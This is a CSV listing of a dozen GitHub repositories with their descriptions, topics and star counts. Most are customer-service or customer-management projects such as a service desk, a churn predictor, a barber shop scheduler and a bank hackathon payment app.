,Url,Description,Topics,Stars
91,https://github.com/choukalos/M2_Api_Example_Scripts.git,Example Scripts that use M2 Customer Service APIs,,7
92,https://github.com/jdinovo/CarServiceManagementSystem.git,"This is Java desktop application interacting with an SQL database to manage and track vehicle service. It also allows dealership service managers and techs to track customers, their vehicles, and service done to those vehicles.","database,statistics,vehicle,java",7
93,https://github.com/krishnabhat81/AWS_SpringBoot_AngularJS.git,"Java application to the AWS cloud platform (EC2, Relational Database Service, S3 Storage). For front end AngularJS. Very simple customer management app (CRUD).",,7
94,https://github.com/ProjectEKA/health-information-user.git,“Health information User” refers to an entity that wishes to consume the services of the Health Data Consent Manager and obtain aggregated health information for providing services to the Customer .,,7
95,https://github.com/joaopcm/gostack-gobarber.git,"👨\u200d🦱 a customer management system, service providers and agenda for barber shops",,7
96,https://github.com/alexgonor/ServiceDesk.git,A Service Desk is a ticket management system which allows enterprises to implement strong and effective work-flows for internal and customer-facing support departments,,7
97,https://github.com/KelvinOyanna/Churn-Prediction.git,The goal of this project was to solve the problem of a telecom operator losing customers to its competitor. A predictive model was built with classification algorithms to predict the likelihood of churn (leaving a service) of a telecom subscriber.,,7
98,https://github.com/awslabs/aws-centralized-waf-and-vpc-security-group-management.git,The AWS Centralized WAF and VPC Security Group Management solution is intended for customers looking to easily manage consistent security posture across their entire AWS Organization. The solution uses AWS Firewall Manager Service.,,7
99,https://github.com/jlmadurga/listenclosely.git,Listenclosely is a django-app that works as a middleman to connect instant messaging clients. Think on a Call Center/Customer Service using using instant messaging... exactly what it does. ,,7
100,https://github.com/IshanSingh611/User-Based-Collaborative-Filtering.git,"There is one famous quote about customer relationship. The summary of the quote like this <b>""Customers don\'t know what they want until we show them.""</b> So Recommendation Systems will help customers to find information, product & services they might not have thought of.",,7
101,https://github.com/barackm/Niky.git,"Niky is an online shop for fashion which sells different kinds of hats, shirts, shoes, and much more, Niky is the number 1 in this service, because it offers you the best quality of all its products and customers are always satisfied.",,7
102,https://github.com/rpadma/Rappay.git,"{""My entry for ICICI Bank Hackathon 2016- Proposed a mobile app with the following functionality     1)      A bank account is at the crux of a user’s relationship with the bank. However, a personalized interface for the user with the bank is still not a reality. I believe this can be changed once a common medium is found. Through this, we will be able to generate highly personalized data analysis to the user for free. This can be represented as simply as a pie diagram or a bar graph. Through this, the user will be able to understand his expenses and also find ways to minimize expenses and save more money. As there is a common medium, we will also find ways for the user to save and invest in the form of discount coupons for the user’s favorite restaurant, cinema hall, etc. We can also offer him stock/mutual fund options suited to his monthly savings and encourage him/her to do more with the data. This information can be conveyed to the user in a form he is familiar with. We can also make mock pitches that contain information post-investment, mutual funds, and its effect on his savings account, etc. This helps in finding potential customers for the bank. All the information will only act as an advisory to the user and the investments/savings will be at his discretion. No such service is available right now.    2)      It is simple, fast, and efficient from both the user and the vendor's point of view. Imagine being able to scan a QR on a bill to make a payment, without entering debit card details or getting redirected to a net banking website or having to open your physical wallet. Welcome to the Future J   ""}","icici,hackathon,java,android,qrcode,payment",7
